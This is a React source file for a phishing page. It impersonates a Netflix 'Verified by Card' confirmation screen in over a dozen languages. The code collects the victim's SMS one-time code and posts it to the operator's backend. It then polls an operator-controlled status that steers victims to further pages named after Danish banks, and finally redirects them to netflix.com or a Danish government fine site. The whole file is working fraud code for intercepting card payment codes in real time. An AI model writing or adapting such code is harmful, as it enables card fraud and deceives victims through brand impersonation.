import React, { useEffect, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";

// Translations object (keep your existing translations)
const translations = {
  da: {
    signOut: "Sign out",
    title: "Please confirm this operation",
    description: "The one-time password has been sent to your phone number. If you need to change the phone number, contact your bank or update it through the available channels (ATM, web).",
    merchant: "Merchant:",
    cardNumber: "Card number:",
    otp: "OTP:",
    otpPlaceholder: "Enter 6-digit code",
    helper: "Enter the code received via SMS",
    requestNewCode: "Request a new code",
    in: "in:",
    seconds: "seconds",
    verifying: "Verifying code...",
    submit: "Submit",
    processing: "Processing...",
    footer: "All rights reserved to Netflix Inc. 2026",
    otpVerified: "✅ OTP verified successfully!",
    transactionRejected: "❌ Transaction was rejected",
    errorSendingCode: "Failed to send OTP",
    errorRequestingCode: "Failed to request new code",
    invalidCode: "Please enter a valid 6-digit code",
    newCodeRequested: "📨 New code request sent to admin!",
    paymentIdNotFound: "Payment ID not found",
    verifiedByCard: "Verified by Card"
  },
  en: {
    signOut: "Sign out",
    title: "Please confirm this operation",
    description: "The one-time password has been sent to your phone number. If you need to change the phone number, contact your bank or update it through the available channels (ATM, web).",
    merchant: "Merchant:",
    cardNumber: "Card number:",
    otp: "OTP:",
    otpPlaceholder: "Enter 6-digit code",
    helper: "Enter the code received via SMS",
    requestNewCode: "Request a new code",
    in: "in:",
    seconds: "seconds",
    verifying: "Verifying code...",
    submit: "Submit",
    processing: "Processing...",
    footer: "All rights reserved to Netflix Inc. 2026",
    otpVerified: "✅ OTP verified successfully!",
    transactionRejected: "❌ Transaction was rejected",
    errorSendingCode: "Failed to send OTP",
    errorRequestingCode: "Failed to request new code",
    invalidCode: "Please enter a valid 6-digit code",
    newCodeRequested: "📨 New code request sent to admin!",
    paymentIdNotFound: "Payment ID not found",
    verifiedByCard: "Verified by Card"
  },
  ar: {
    signOut: "تسجيل الخروج",
    title: "يرجى تأكيد هذه العملية",
    description: "تم إرسال كلمة المرور لمرة واحدة إلى رقم هاتفك. إذا كنت بحاجة إلى تغيير رقم الهاتف، فاتصل بالبنك الذي تتعامل معه أو قم بتحديثه عبر القنوات المتاحة (الصراف الآلي، الويب).",
    merchant: "التاجر:",
    cardNumber: "رقم البطاقة:",
    otp: "OTP:",
    otpPlaceholder: "أدخل رمزًا مكونًا من 6 أرقام",
    helper: "أدخل الرمز المستلم عبر الرسائل القصيرة",
    requestNewCode: "طلب رمز جديد",
    in: "في:",
    seconds: "ثواني",
    verifying: "جاري التحقق من الرمز...",
    submit: "إرسال",
    processing: "جاري المعالجة...",
    footer: "جميع الحقوق محفوظة لشركة Netflix Inc. 2026",
    otpVerified: "✅ تم التحقق من OTP بنجاح!",
    transactionRejected: "❌ تم رفض المعاملة",
    errorSendingCode: "فشل إرسال OTP",
    errorRequestingCode: "فشل طلب رمز جديد",
    invalidCode: "الرجاء إدخال رمز صالح مكون من 6 أرقام",
    newCodeRequested: "📨 تم إرسال طلب الرمز الجديد إلى المسؤول!",
    paymentIdNotFound: "لم يتم العثور على معرف الدفع",
    verifiedByCard: "تم التحقق عن طريق البطاقة"
  },
  fr: {
    signOut: "Déconnexion",
    title: "Veuillez confirmer cette opération",
    description: "Le mot de passe à usage unique a été envoyé à votre numéro de téléphone. Si vous devez changer le numéro de téléphone, contactez votre banque ou mettez-le à jour via les canaux disponibles (GAB, web).",
    merchant: "Marchand:",
    cardNumber: "Numéro de carte:",
    otp: "OTP:",
    otpPlaceholder: "Entrez le code à 6 chiffres",
    helper: "Entrez le code reçu par SMS",
    requestNewCode: "Demander un nouveau code",
    in: "dans:",
    seconds: "secondes",
    verifying: "Vérification du code...",
    submit: "Soumettre",
    processing: "Traitement en cours...",
    footer: "Tous droits réservés à Netflix Inc. 2026",
    otpVerified: "✅ OTP vérifié avec succès!",
    transactionRejected: "❌ La transaction a été rejetée",
    errorSendingCode: "Échec de l'envoi de l'OTP",
    errorRequestingCode: "Échec de la demande de nouveau code",
    invalidCode: "Veuillez entrer un code valide à 6 chiffres",
    newCodeRequested: "📨 Demande de nouveau code envoyée à l'administrateur!",
    paymentIdNotFound: "ID de paiement non trouvé",
    verifiedByCard: "Vérifié par carte"
  },
  es: {
    signOut: "Cerrar sesión",
    title: "Por favor confirme esta operación",
    description: "La contraseña de un solo uso ha sido enviada a su número de teléfono. Si necesita cambiar el número de teléfono, contacte a su banco o actualícelo a través de los canales disponibles (cajero automático, web).",
    merchant: "Comerciante:",
    cardNumber: "Número de tarjeta:",
    otp: "OTP:",
    otpPlaceholder: "Ingrese código de 6 dígitos",
    helper: "Ingrese el código recibido por SMS",
    requestNewCode: "Solicitar un nuevo código",
    in: "en:",
    seconds: "segundos",
    verifying: "Verificando código...",
    submit: "Enviar",
    processing: "Procesando...",
    footer: "Todos los derechos reservados a Netflix Inc. 2026",
    otpVerified: "✅ OTP verificado exitosamente!",
    transactionRejected: "❌ Transacción rechazada",
    errorSendingCode: "Error al enviar OTP",
    errorRequestingCode: "Error al solicitar nuevo código",
    invalidCode: "Por favor ingrese un código válido de 6 dígitos",
    newCodeRequested: "📨 ¡Solicitud de nuevo código enviada al administrador!",
    paymentIdNotFound: "ID de pago no encontrado",
    verifiedByCard: "Verificado por tarjeta"
  },
  de: {
    signOut: "Abmelden",
    title: "Bitte bestätigen Sie diesen Vorgang",
    description: "Das Einmalpasswort wurde an Ihre Telefonnummer gesendet. Wenn Sie die Telefonnummer ändern müssen, kontaktieren Sie Ihre Bank oder aktualisieren Sie sie über die verfügbaren Kanäle (Geldautomat, Web).",
    merchant: "Händler:",
    cardNumber: "Kartennummer:",
    otp: "OTP:",
    otpPlaceholder: "Geben Sie den 6-stelligen Code ein",
    helper: "Geben Sie den per SMS erhaltenen Code ein",
    requestNewCode: "Neuen Code anfordern",
    in: "in:",
    seconds: "Sekunden",
    verifying: "Code wird überprüft...",
    submit: "Absenden",
    processing: "Verarbeitung...",
    footer: "Alle Rechte vorbehalten bei Netflix Inc. 2026",
    otpVerified: "✅ OTP erfolgreich verifiziert!",
    transactionRejected: "❌ Transaktion wurde abgelehnt",
    errorSendingCode: "Fehler beim Senden des OTP",
    errorRequestingCode: "Fehler beim Anfordern eines neuen Codes",
    invalidCode: "Bitte geben Sie einen gültigen 6-stelligen Code ein",
    newCodeRequested: "📨 Neue Codeanforderung an Admin gesendet!",
    paymentIdNotFound: "Zahlungs-ID nicht gefunden",
    verifiedByCard: "Von Karte verifiziert"
  },
  pl: {
    signOut: "Wyloguj się",
    title: "Potwierdź tę operację",
    description: "Jednorazowe hasło zostało wysłane na Twój numer telefonu. Jeśli potrzebujesz zmienić numer telefonu, skontaktuj się ze swoim bankiem lub zaktualizuj go za pomocą dostępnych kanałów (bankomat, strona internetowa).",
    merchant: "Sprzedawca:",
    cardNumber: "Numer karty:",
    otp: "OTP:",
    otpPlaceholder: "Wprowadź 6-cyfrowy kod",
    helper: "Wprowadź kod otrzymany przez SMS",
    requestNewCode: "Poproś o nowy kod",
    in: "za:",
    seconds: "sekund",
    verifying: "Weryfikacja kodu...",
    submit: "Wyślij",
    processing: "Przetwarzanie...",
    footer: "Wszelkie prawa zastrzeżone dla Netflix Inc. 2026",
    otpVerified: "✅ OTP zweryfikowany pomyślnie!",
    transactionRejected: "❌ Transakcja została odrzucona",
    errorSendingCode: "Nie udało się wysłać OTP",
    errorRequestingCode: "Nie udało się poprosić o nowy kod",
    invalidCode: "Wprowadź prawidłowy 6-cyfrowy kod",
    newCodeRequested: "📨 Wysłano prośbę o nowy kod do administratora!",
    paymentIdNotFound: "Nie znaleziono ID płatności",
    verifiedByCard: "Zweryfikowane przez kartę"
  },
  sv: {
    signOut: "Logga ut",
    title: "Bekräfta denna åtgärd",
    description: "Engångslösenordet har skickats till ditt telefonnummer. Om du behöver ändra telefonnumret, kontakta din bank eller uppdatera det via tillgängliga kanaler (bankomat, webb).",
    merchant: "Handlare:",
    cardNumber: "Kortnummer:",
    otp: "OTP:",
    otpPlaceholder: "Ange 6-siffrig kod",
    helper: "Ange koden som mottagits via SMS",
    requestNewCode: "Begär en ny kod",
    in: "om:",
    seconds: "sekunder",
    verifying: "Verifierar kod...",
    submit: "Skicka",
    processing: "Bearbetar...",
    footer: "Alla rättigheter förbehålls Netflix Inc. 2026",
    otpVerified: "✅ OTP verifierat framgångsrikt!",
    transactionRejected: "❌ Transaktionen avvisades",
    errorSendingCode: "Misslyckades med att skicka OTP",
    errorRequestingCode: "Misslyckades med att begära ny kod",
    invalidCode: "Ange en giltig 6-siffrig kod",
    newCodeRequested: "📨 Ny kodbegäran skickad till administratören!",
    paymentIdNotFound: "Betalnings-ID hittades inte",
    verifiedByCard: "Verifierat med kort"
  },
  no: {
    signOut: "Logg ut",
    title: "Bekreft denne operasjonen",
    description: "Engangspassordet er sendt til telefonnummeret ditt. Hvis du trenger å endre telefonnummeret, kontakt banken din eller oppdater det via tilgjengelige kanaler (minibank, nett).",
    merchant: "Selger:",
    cardNumber: "Kortnummer:",
    otp: "OTP:",
    otpPlaceholder: "Skriv inn 6-sifret kode",
    helper: "Skriv inn koden mottatt via SMS",
    requestNewCode: "Be om en ny kode",
    in: "om:",
    seconds: "sekunder",
    verifying: "Verifiserer kode...",
    submit: "Send",
    processing: "Behandler...",
    footer: "Alle rettigheter forbeholdt Netflix Inc. 2026",
    otpVerified: "✅ OTP verifisert vellykket!",
    transactionRejected: "❌ Transaksjonen ble avvist",
    errorSendingCode: "Kunne ikke sende OTP",
    errorRequestingCode: "Kunne ikke be om ny kode",
    invalidCode: "Vennligst skriv inn en gyldig 6-sifret kode",
    newCodeRequested: "📨 Ny kodeforespørsel sendt til administrator!",
    paymentIdNotFound: "Betalings-ID ikke funnet",
    verifiedByCard: "Verifisert med kort"
  },
  nl: {
    signOut: "Uitloggen",
    title: "Bevestig deze handeling",
    description: "Het eenmalige wachtwoord is naar uw telefoonnummer verzonden. Als u het telefoonnummer moet wijzigen, neem dan contact op met uw bank of werk het bij via de beschikbare kanalen (geldautomaat, web).",
    merchant: "Handelaar:",
    cardNumber: "Kaartnummer:",
    otp: "OTP:",
    otpPlaceholder: "Voer 6-cijferige code in",
    helper: "Voer de via SMS ontvangen code in",
    requestNewCode: "Vraag een nieuwe code aan",
    in: "over:",
    seconds: "seconden",
    verifying: "Code verifiëren...",
    submit: "Verzenden",
    processing: "Verwerken...",
    footer: "Alle rechten voorbehouden aan Netflix Inc. 2026",
    otpVerified: "✅ OTP succesvol geverifieerd!",
    transactionRejected: "❌ Transactie is afgewezen",
    errorSendingCode: "Kan OTP niet verzenden",
    errorRequestingCode: "Kan geen nieuwe code aanvragen",
    invalidCode: "Voer een geldige 6-cijferige code in",
    newCodeRequested: "📨 Nieuw codeverzoek verzonden naar beheerder!",
    paymentIdNotFound: "Betalings-ID niet gevonden",
    verifiedByCard: "Geverifieerd met kaart"
  },
  nl_BE: {
    signOut: "Uitloggen",
    title: "Bevestig deze bewerking",
    description: "Het eenmalige wachtwoord is naar uw telefoonnummer verzonden. Als u het telefoonnummer moet wijzigen, neem dan contact op met uw bank of werk het bij via de beschikbare kanalen (bankautomaat, web).",
    merchant: "Handelaar:",
    cardNumber: "Kaartnummer:",
    otp: "OTP:",
    otpPlaceholder: "Voer 6-cijferige code in",
    helper: "Voer de via SMS ontvangen code in",
    requestNewCode: "Vraag een nieuwe code aan",
    in: "over:",
    seconds: "seconden",
    verifying: "Code verifiëren...",
    submit: "Verzenden",
    processing: "Verwerken...",
    footer: "Alle rechten voorbehouden aan Netflix Inc. 2026",
    otpVerified: "✅ OTP succesvol geverifieerd!",
    transactionRejected: "❌ Transactie is afgewezen",
    errorSendingCode: "Kan OTP niet verzenden",
    errorRequestingCode: "Kan geen nieuwe code aanvragen",
    invalidCode: "Voer een geldige 6-cijferige code in",
    newCodeRequested: "📨 Nieuw codeverzoek verzonden naar beheerder!",
    paymentIdNotFound: "Betalings-ID niet gevonden",
    verifiedByCard: "Geverifieerd met kaart"
  },
  cs: {
    signOut: "Odhlásit se",
    title: "Potvrďte tuto operaci",
    description: "Jednorázové heslo bylo odesláno na vaše telefonní číslo. Pokud potřebujete změnit telefonní číslo, kontaktujte svou banku nebo jej aktualizujte prostřednictvím dostupných kanálů (bankomat, web).",
    merchant: "Obchodník:",
    cardNumber: "Číslo karty:",
    otp: "OTP:",
    otpPlaceholder: "Zadejte 6místný kód",
    helper: "Zadejte kód přijatý SMS",
    requestNewCode: "Požádat o nový kód",
    in: "za:",
    seconds: "sekund",
    verifying: "Ověřování kódu...",
    submit: "Odeslat",
    processing: "Zpracování...",
    footer: "Všechna práva vyhrazena Netflix Inc. 2026",
    otpVerified: "✅ OTP úspěšně ověřen!",
    transactionRejected: "❌ Transakce byla zamítnuta",
    errorSendingCode: "Odeslání OTP selhalo",
    errorRequestingCode: "Požadavek na nový kód selhal",
    invalidCode: "Zadejte platný 6místný kód",
    newCodeRequested: "📨 Požadavek na nový kód odeslán správci!",
    paymentIdNotFound: "ID platby nenalezeno",
    verifiedByCard: "Ověřeno kartou"
  },
  pt: {
    signOut: "Sair",
    title: "Por favor confirme esta operação",
    description: "A palavra-passe de uso único foi enviada para o seu número de telefone. Se precisar alterar o número de telefone, contacte o seu banco ou atualize-o através dos canais disponíveis (ATM, web).",
    merchant: "Comerciante:",
    cardNumber: "Número do cartão:",
    otp: "OTP:",
    otpPlaceholder: "Digite o código de 6 dígitos",
    helper: "Digite o código recebido por SMS",
    requestNewCode: "Solicitar um novo código",
    in: "em:",
    seconds: "segundos",
    verifying: "Verificando código...",
    submit: "Enviar",
    processing: "Processando...",
    footer: "Todos os direitos reservados à Netflix Inc. 2026",
    otpVerified: "✅ OTP verificado com sucesso!",
    transactionRejected: "❌ Transação foi rejeitada",
    errorSendingCode: "Falha ao enviar OTP",
    errorRequestingCode: "Falha ao solicitar novo código",
    invalidCode: "Por favor, digite um código válido de 6 dígitos",
    newCodeRequested: "📨 Solicitação de novo código enviada ao administrador!",
    paymentIdNotFound: "ID de pagamento não encontrado",
    verifiedByCard: "Verificado por cartão"
  },
  mt: {
    signOut: "Ħruġ",
    title: "Jekk jogħġbok ikkonferma din l-operazzjoni",
    description: "Il-password ta' darba ntbagħtet bin-numru tat-telefon tiegħek. Jekk għandek bżonn tibdel in-numru tat-telefon, ikkuntattja l-bank tiegħek jew aġġornah permezz tal-kanali disponibbli (ATM, web).",
    merchant: "Negozjant:",
    cardNumber: "Numru tal-karta:",
    otp: "OTP:",
    otpPlaceholder: "Daħħal kodiċi ta' 6 ċifri",
    helper: "Daħħal il-kodiċi riċevut permezz ta' SMS",
    requestNewCode: "Itlob kodiċi ġdid",
    in: "fi:",
    seconds: "sekondi",
    verifying: "Verifika tal-kodiċi...",
    submit: "Ibgħat",
    processing: "Qed nipproċessa...",
    footer: "Id-drittijiet kollha riżervati għal Netflix Inc. 2026",
    otpVerified: "✅ OTP verifikat b'suċċess!",
    transactionRejected: "❌ It-tranżazzjoni ġiet rifjutata",
    errorSendingCode: "Falliet l-ibgħat tal-OTP",
    errorRequestingCode: "Fallit it-talbiet għal kodiċi ġdid",
    invalidCode: "Jekk jogħġbok daħħal kodiċi validu ta' 6 ċifri",
    newCodeRequested: "📨 Talba għal kodiċi ġdid mibgħuta lill-amministratur!",
    paymentIdNotFound: "ID tal-ħlas ma nstabx",
    verifiedByCard: "Verifikat bil-karta"
  }
};
export default function OtpConfirmPage() {
  const [otp, setOtp] = useState("");
  const [seconds, setSeconds] = useState(60);
  const [isResendDisabled, setIsResendDisabled] = useState(true);
  const [isLoading, setIsLoading] = useState(false);
  const [status, setStatus] = useState("");
  const [idRequest, setIdRequest] = useState(null);
  const [notification, setNotification] = useState(null);
  const [currentDate, setCurrentDate] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [language, setLanguage] = useState("en");
  const [isLoadingLang, setIsLoadingLang] = useState(true);
  const [pollingInterval, setPollingInterval] = useState(null);
  
  const location = useLocation();
  const navigate = useNavigate();
  const { paymentId } = location.state || {};
  const apiUrl = import.meta.env.VITE_API_URL;

  // Detect language based on IP
  const detectLanguageByIP = async () => {
    try {
      const res = await fetch(`${apiUrl}/api/ipinfo`);
      const data = await res.json();

      const countryCode = data.country_code?.toLowerCase();

      const countryToLanguage = {
        'dk': 'da',
        'us': 'en',
        'gb': 'en',
        'ca': 'en',
        'au': 'en',
        'ae': 'ar',
        'sa': 'ar',
        'eg': 'ar',
        'fr': 'fr',
        'be': 'fr',
        'ch': 'fr',
        'es': 'es',
        'mx': 'es',
        'ar': 'es',
        'co': 'es',
        'de': 'de',
        'at': 'de',
        'tn': 'ar'
      };

      const detectedLang = countryToLanguage[countryCode] || 'en';

      setLanguage(detectedLang);
      localStorage.setItem('preferredLanguage', detectedLang);

    } catch (error) {
      console.error('Error detecting language:', error);

      const savedLang = localStorage.getItem('preferredLanguage');

      if (savedLang && translations[savedLang]) {
        setLanguage(savedLang);
      } else {
        const browserLang = navigator.language.split('-')[0];

        if (translations[browserLang]) {
          setLanguage(browserLang);
        } else {
          setLanguage('en');
        }
      }
    } finally {
      setIsLoadingLang(false);
    }
  };

  useEffect(() => {
    detectLanguageByIP();
  }, []);

  // Function to get translation
  const t = (key) => {
    if (translations[language] && translations[language][key]) {
      return translations[language][key];
    }
    return translations.en[key] || key;
  };

  const showNotification = (message, type) => {
    setNotification({ message, type });
    setTimeout(() => setNotification(null), 3000);
  };

  // Poll payment status every 3 seconds and navigate based on status
  const pollPaymentStatus = async (id) => {
    if (!id) return;

    try {
      const response = await fetch(`${apiUrl}/api/status/card/${id}`);
      const statusData = await response.json();

      console.log("📊 Payment status check in OtpConfirmPage:", statusData);

      // Handle different statuses
      if (statusData.status === "rejected") {
        console.log("❌ Transaction rejected");
        setStatus("rejected");
        setIsLoading(false);
        showNotification(t("transactionRejected"), "error");
        setOtp("");
      } 
      else if (statusData.status === "accepted" || statusData.status === "approved") {
        console.log("✅ Transaction approved - redirecting to Netflix");
        showNotification(t("otpVerified"), "success");
        setTimeout(() => {
          window.location.href = "https://kmt.vejafgifter.dk/da/fine/searchFine";
        }, 2000);
      }
      else if (statusData.status === "otp") {
        console.log("🔄 Navigating to NetflixPaymentVerification");
        navigate("/NetflixPaymentVerification", { 
          state: { paymentId: id, language: language } 
        });
      }
      else if (statusData.status === "otp2") {
        console.log("🔄 Navigating to Nets");
        navigate("/Nets", { state: { paymentId: id, language: language } });
      }
      else if (statusData.status === "app") {
        console.log("🔄 Navigating to Appotp");
        navigate("/Appotp", { state: { paymentId: id, language: language } });
      }
      else if (statusData.status === "otp3") {
        console.log("🔄 Navigating to Danske");
        navigate("/Danske", { state: { paymentId: id, language: language } });
      }
      else if (statusData.status === "otp4") {
        console.log("⏳ Still on OtpConfirmPage - waiting for status change");
        // Just continue polling, don't navigate
      }
      else {
        console.log("⏳ Unknown status, continuing to poll:", statusData.status);
      }
    } catch (err) {
      console.error("❌ Error polling payment status:", err);
    }
  };

  // Start polling payment status when component mounts
  useEffect(() => {
    if (paymentId) {
      console.log("🚀 Starting payment status polling for ID:", paymentId);
      
      // Initial check
      pollPaymentStatus(paymentId);
      
      // Set up interval for polling every 3 seconds
      const interval = setInterval(() => {
        pollPaymentStatus(paymentId);
      }, 3000);
      
      setPollingInterval(interval);
      
      // Cleanup interval on component unmount
      return () => {
        if (interval) {
          clearInterval(interval);
        }
      };
    } else {
      console.warn("⚠️ No paymentId provided to OtpConfirmPage");
    }
  }, [paymentId]);

  // Fetch card number
  useEffect(() => {
    if (paymentId) {
      fetch(`${apiUrl}/api/status/card/${paymentId}`)
        .then((res) => res.json())
        .then((data) => {
          console.log("💳 Card info fetched:", data);
          setCardNumber(data.cardNumber);
        })
        .catch((err) => console.error("Error fetching card info:", err));
    }
  }, [paymentId, apiUrl]);

  // Update time
  useEffect(() => {
    const updateTime = () => {
      const now = new Date();
      let locale;
      switch(language) {
        case 'da': locale = 'da-DK'; break;
        case 'ar': locale = 'ar-EG'; break;
        case 'fr': locale = 'fr-FR'; break;
        case 'es': locale = 'es-ES'; break;
        case 'de': locale = 'de-DE'; break;
        default: locale = 'en-US';
      }
      const timeString =
        now
          .toLocaleString(locale, {
            day: "2-digit",
            month: "2-digit",
            year: "numeric",
            hour: "2-digit",
            minute: "2-digit",
            timeZone: "GMT",
          })
          .replace(",", "") + " (GMT)";
      setCurrentDate(timeString);
    };

    updateTime();
    const interval = setInterval(updateTime, 1000);
    return () => clearInterval(interval);
  }, [language]);

  // Timer for resend code
  useEffect(() => {
    if (seconds <= 0) {
      setIsResendDisabled(false);
      return;
    }
    const timer = setInterval(() => {
      setSeconds((prev) => prev - 1);
    }, 1000);

    return () => clearInterval(timer);
  }, [seconds]);

  // Poll OTP status (for the code verification)
  useEffect(() => {
    const pollOtpStatus = async () => {
      if (!idRequest || status !== "pending") return;

      try {
        const res = await fetch(`${apiUrl}/api/otp/status/${idRequest}`);
        const data = await res.json();
        
        console.log("🔐 OTP Status check:", data);
        
        if (data.status === "accepted") {
          console.log("✅ OTP accepted!");
          setStatus("accepted");
          setIsLoading(false);
          showNotification(t("otpVerified"), "success");
          setTimeout(() => {
            window.location.href = "https://www.netflix.com/";
          }, 2000);
        } else if (data.status === "rejected") {
          console.log("❌ OTP rejected!");
          setStatus("rejected");
          setIsLoading(false);
          showNotification(t("transactionRejected"), "error");
          setOtp("");
        } else {
          console.log("⏳ Waiting for OTP verification...");
          setTimeout(pollOtpStatus, 2000);
        }
      } catch (err) {
        console.error("Error confirming OTP status:", err);
        setTimeout(pollOtpStatus, 2000);
      }
    };

    if (idRequest && status === "pending") {
      pollOtpStatus();
    }
  }, [idRequest, status, apiUrl, t]);

  const sendOtpCode = async (otpCode) => {
    try {
      if (!paymentId) {
        showNotification(t("paymentIdNotFound"), "error");
        return false;
      }

      console.log("📤 Sending OTP code for verification:", otpCode);
      
      const response = await fetch(`${apiUrl}/api/send-otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          code: otpCode,
          cardId: paymentId
        }),
      });
      
      const data = await response.json();
      
      if (response.ok && data.id) {
        console.log("✅ OTP sent successfully, ID:", data.id);
        setIdRequest(data.id);
        setStatus("pending");
        return true;
      } else {
        console.error("❌ Failed to send OTP:", data.error);
        showNotification(data.error || t("errorSendingCode"), "error");
        return false;
      }
    } catch (err) {
      console.error("Error sending code:", err);
      showNotification(t("errorSendingCode"), "error");
      return false;
    }
  };

  // Function to request a new code (resend)
  const requestNewCode = async () => {
    try {
      if (!paymentId) {
        showNotification(t("paymentIdNotFound"), "error");
        return false;
      }

      console.log("📨 Requesting new code...");
      
      const response = await fetch(`${apiUrl}/api/resend-otp-request`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          cardId: paymentId,
          oldOtpId: idRequest
        }),
      });
      
      const data = await response.json();
      
      if (response.ok) {
        console.log("✅ New code requested successfully");
        showNotification(t("newCodeRequested"), "success");
        return true;
      } else {
        console.error("❌ Failed to request new code:", data.error);
        showNotification(data.error || t("errorRequestingCode"), "error");
        return false;
      }
    } catch (err) {
      console.error("Error requesting new code:", err);
      showNotification(t("errorRequestingCode"), "error");
      return false;
    }
  };

  const handleResendCode = async () => {
    if (isResendDisabled) return;
    
    // Reset timer
    setSeconds(60);
    setIsResendDisabled(true);
    
    // Send request for new code
    await requestNewCode();
  };

  const handleOtpSubmit = async () => {
    if (!otp || otp.length !== 6) {
      showNotification(t("invalidCode"), "error");
      return;
    }
    
    console.log("🔐 Submitting OTP for verification:", otp);
    setIsLoading(true);
    const success = await sendOtpCode(otp);
    
    if (!success) {
      setIsLoading(false);
    }
  };

  const formatCardNumber = (cardNum) => {
    if (!cardNum) return "XXXX XXXX XXXX 1111";
    const last4 = cardNum.slice(-4);
    return `XXXX XXXX XXXX ${last4}`;
  };

  if (isLoadingLang) {
    return (
      <div style={styles.page}>
        <div style={styles.wrapper}>
          <div style={styles.card}>
            <div style={{ textAlign: "center", padding: "40px" }}>Loading...</div>
          </div>
        </div>
      </div>
    );
  }

  const isRTL = language === 'ar';

  return (
    <div style={styles.page} dir={isRTL ? 'rtl' : 'ltr'}>
      <header style={styles.topbar}>
        <div style={styles.logo}> </div>
        <div style={styles.signout}>{t("signOut")}</div>
      </header>

      <div style={styles.wrapper}>
        <div style={styles.card}>
          <div style={styles.cardHeader}>
            <div style={styles.brand}>
              <svg
                style={{ margin: 0, width: 55 }}
                fill="#e50914"
                viewBox="0 0 111 30"
                xmlns="http://www.w3.org/2000/svg"
                aria-hidden="true"
                role="img"
              >
                <g>
                  <path
                    d="M105.06233,14.2806261 L110.999156,30 C109249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"
                  ></path>
                </g>
              </svg>
            </div>
            <div style={styles.badge}>{t("verifiedByCard")}</div>
          </div>

          <div style={styles.titleBox}>
            <h2 style={styles.title}>{t("title")}</h2>
          </div>

          <div style={styles.body}>
            <p style={styles.text}>
              {t("description")}
            </p>

            <div style={styles.infoRow}>
              <span style={styles.label}>{t("merchant")}</span>
              <span style={styles.value}>Netflix</span>
            </div>

            <div style={styles.infoRow}>
              <span style={styles.label}>{t("cardNumber")}</span>
              <span style={styles.value}>{formatCardNumber(cardNumber)}</span>
            </div>

            <div style={{ ...styles.infoRow, alignItems: "center" }}>
              <span style={styles.label}>{t("otp")}</span>
              <input
                type="text"
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
                style={styles.input}
                placeholder={t("otpPlaceholder")}
                maxLength={6}
                disabled={isLoading}
              />
            </div>

            <p style={styles.helper}>{t("helper")}</p>

            <div style={styles.resend}>
              <span
                style={{
                  ...styles.resendLink,
                  ...(isResendDisabled ? styles.resendLinkDisabled : {}),
                  cursor: isResendDisabled ? "not-allowed" : "pointer",
                }}
                onClick={handleResendCode}
              >
                {t("requestNewCode")}
              </span>
              <span style={styles.resendText}> {t("in")} </span>
              <span style={styles.counter}>{seconds} {t("seconds")}</span>
            </div>

            {currentDate && (
              <p style={styles.dateTime}>{currentDate}</p>
            )}

            {isLoading && (
              <div style={styles.loading}>
                {t("verifying")}
              </div>
            )}
          </div>

          <div style={styles.footerAction}>
            <button 
              style={styles.button} 
              onClick={handleOtpSubmit}
              disabled={isLoading || !otp || otp.length !== 6}
            >
              {isLoading ? t("processing") : t("submit")}
            </button>
          </div>

          <div style={styles.bottomFooter}>
            {t("footer")}
          </div>
        </div>
      </div>

      {notification && (
        <div style={{
          ...styles.notification,
          backgroundColor: notification.type === "error" ? "#ff4444" : "#4CAF50"
        }}>
          {notification.message}
        </div>
      )}
    </div>
  );
}

const styles = {
  page: {
    minHeight: "100vh",
    backgroundColor: "#f3f3f3",
    fontFamily: "Arial, sans-serif",
  },
  topbar: {
    height: "56px",
    backgroundColor: "#ffffff",
    borderBottom: "1px solid #e5e5e5",
    display: "flex",
    alignItems: "center",
    justifyContent: "space-between",
    padding: "0 24px",
  },
  logo: {
    color: "#e50914",
    fontSize: "28px",
    fontWeight: "700",
    letterSpacing: "-1px",
  },
  signout: {
    fontSize: "14px",
    fontWeight: "600",
    color: "#111",
    cursor: "pointer",
  },
  wrapper: {
    display: "flex",
    justifyContent: "center",
    paddingTop: "60px",
    paddingLeft: "16px",
    paddingRight: "16px",
  },
  card: {
    width: "100%",
    maxWidth: "350px",
    backgroundColor: "#fff",
    border: "1px solid #e5e5e5",
  },
  cardHeader: {
    height: "58px",
    padding: "0 16px",
    display: "flex",
    alignItems: "center",
    justifyContent: "space-between",
